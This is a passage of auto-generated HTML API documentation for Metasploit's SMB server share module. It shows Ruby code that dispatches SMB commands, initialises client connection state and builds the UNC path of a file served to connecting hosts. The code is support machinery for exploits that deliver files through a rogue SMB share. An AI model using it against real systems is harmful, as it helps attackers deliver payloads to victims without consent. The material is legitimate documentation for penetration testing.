  <span class='id identifier rubyid_smb'>smb</span><span class='lbracket'>[</span><span class='symbol'>:user_id</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_pkt'>pkt</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SMB</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_v'>v</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>UserID</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_smb'>smb</span><span class='lbracket'>[</span><span class='symbol'>:tree_id</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_pkt'>pkt</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SMB</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_v'>v</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>TreeID</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_smb'>smb</span><span class='lbracket'>[</span><span class='symbol'>:multiplex_id</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_pkt'>pkt</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SMB</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_v'>v</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MultiplexID</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>

  <span class='kw'>case</span> <span class='id identifier rubyid_cmd'>cmd</span>
    <span class='kw'>when</span> <span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_COM_NEGOTIATE</span>
      <span class='kw'>return</span> <span class='id identifier rubyid_smb_cmd_negotiate'>smb_cmd_negotiate</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
    <span class='kw'>when</span> <span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_COM_SESSION_SETUP_ANDX</span>
      <span class='id identifier rubyid_word_count'>word_count</span> <span class='op'>=</span> <span class='id identifier rubyid_pkt'>pkt</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SMB</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_v'>v</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WordCount</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
      <span class='kw'>if</span> <span class='id identifier rubyid_word_count'>word_count</span> <span class='op'>==</span> <span class='int'>0x0d</span> <span class='comment'># Share Security Mode sessions
</span>        <span class='kw'>return</span> <span class='id identifier rubyid_smb_cmd_session_setup_andx'>smb_cmd_session_setup_andx</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
      <span class='kw'>else</span>
        <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>SMB Share - </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_smb'>smb</span><span class='lbracket'>[</span><span class='symbol'>:ip</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'> Unknown SMB_COM_SESSION_SETUP_ANDX request type, ignoring... </span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
        <span class='kw'>return</span> <span class='id identifier rubyid_smb_error'>smb_error</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd'>cmd</span><span class='comma'>,</span> <span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_STATUS_SUCCESS</span><span class='rparen'>)</span>
      <span class='kw'>end</span>
    <span class='kw'>when</span> <span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_COM_TRANSACTION2</span>
      <span class='kw'>return</span> <span class='id identifier rubyid_smb_cmd_trans2'>smb_cmd_trans2</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
    <span class='kw'>when</span> <span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_COM_NT_CREATE_ANDX</span>
      <span class='kw'>return</span> <span class='id identifier rubyid_smb_cmd_nt_create_andx'>smb_cmd_nt_create_andx</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
    <span class='kw'>when</span> <span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_COM_READ_ANDX</span>
      <span class='kw'>return</span> <span class='id identifier rubyid_smb_cmd_read_andx'>smb_cmd_read_andx</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
    <span class='kw'>when</span> <span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_COM_CLOSE</span>
      <span class='kw'>return</span> <span class='id identifier rubyid_smb_cmd_close'>smb_cmd_close</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
    <span class='kw'>else</span>
      <span class='id identifier rubyid_vprint_status'>vprint_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>SMB Share - </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_smb'>smb</span><span class='lbracket'>[</span><span class='symbol'>:ip</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'> Unknown SMB command </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd'>cmd</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='lparen'>(</span><span class='int'>16</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>, ignoring... </span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
      <span class='kw'>return</span> <span class='id identifier rubyid_smb_error'>smb_error</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd'>cmd</span><span class='comma'>,</span> <span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_STATUS_SUCCESS</span><span class='rparen'>)</span>
  <span class='kw'>end</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="smb_conn-instance_method">
  
    #<strong>smb_conn</strong>(c)  &#x21d2; <tt>Hash</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>New connection handler, executed when there is a new connection.</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>c</span>
      
      
        <span class='type'>(<tt>Socket</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The client establishing the connection.</p>
</div>
      
    </li>
  
</ul>

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>Hash</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The hash with the client data initialized.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


249
250
251
252
253
254
255
256
257
258
259</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 249</span>

<span class='kw'>def</span> <span class='id identifier rubyid_smb_conn'>smb_conn</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='rparen'>)</span>
  <span class='ivar'>@state</span><span class='lbracket'>[</span><span class='id identifier rubyid_c'>c</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='lbrace'>{</span>
    <span class='symbol'>:name</span>         <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_c'>c</span><span class='period'>.</span><span class='id identifier rubyid_peerhost'>peerhost</span><span class='embexpr_end'>}</span><span class='tstring_content'>:</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_c'>c</span><span class='period'>.</span><span class='id identifier rubyid_peerport'>peerport</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
    <span class='symbol'>:ip</span>           <span class='op'>=&gt;</span> <span class='id identifier rubyid_c'>c</span><span class='period'>.</span><span class='id identifier rubyid_peerhost'>peerhost</span><span class='comma'>,</span>
    <span class='symbol'>:port</span>         <span class='op'>=&gt;</span> <span class='id identifier rubyid_c'>c</span><span class='period'>.</span><span class='id identifier rubyid_peerport'>peerport</span><span class='comma'>,</span>
    <span class='symbol'>:multiplex_id</span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>0xffff</span><span class='rparen'>)</span><span class='comma'>,</span>
    <span class='symbol'>:process_id</span>   <span class='op'>=&gt;</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>0xffff</span><span class='rparen'>)</span><span class='comma'>,</span>
    <span class='symbol'>:file_id</span>      <span class='op'>=&gt;</span> <span class='int'>0xdead</span><span class='comma'>,</span>
    <span class='symbol'>:dir_id</span>       <span class='op'>=&gt;</span> <span class='int'>0xbeef</span>
  <span class='rbrace'>}</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="srvhost-instance_method">
  
    #<strong>srvhost</strong>  &#x21d2; <tt>String</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Builds the server address.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The server address.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


241
242
243</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 241</span>

<span class='kw'>def</span> <span class='id identifier rubyid_srvhost'>srvhost</span>
  <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SRVHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>0.0.0.0</span><span class='tstring_end'>&#39;</span></span> <span class='op'>?</span> <span class='const'><span class='object_link'><a href="../../../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Socket</span><span class='period'>.</span><span class='id identifier rubyid_source_address'>source_address</span> <span class='op'>:</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SRVHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="unc-instance_method">
  
    #<strong>unc</strong>  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Builds the UNC Name for the shared file</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


216
217
218
219
220
221
222
223
224</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 216</span>

<span class='kw'>def</span> <span class='id identifier rubyid_unc'>unc</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_folder_name'>folder_name</span>
    <span class='id identifier rubyid_path'>path</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\\\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_srvhost'>srvhost</span><span class='embexpr_end'>}</span><span class='tstring_content'>\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_share'>share</span><span class='embexpr_end'>}</span><span class='tstring_content'>\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_folder_name'>folder_name</span><span class='embexpr_end'>}</span><span class='tstring_content'>\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_file_name'>file_name</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
  <span class='kw'>else</span>
    <span class='id identifier rubyid_path'>path</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\\\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_srvhost'>srvhost</span><span class='embexpr_end'>}</span><span class='tstring_content'>\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_share'>share</span><span class='embexpr_end'>}</span><span class='tstring_content'>\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_file_name'>file_name</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_path'>path</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>

</div>

      <div id="footer">
  Generated on Wed Mar 31 00:31:42 2021 by
  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
  0.9.26 (ruby-2.7.2).
</div>

    </div>
  </body>
</html>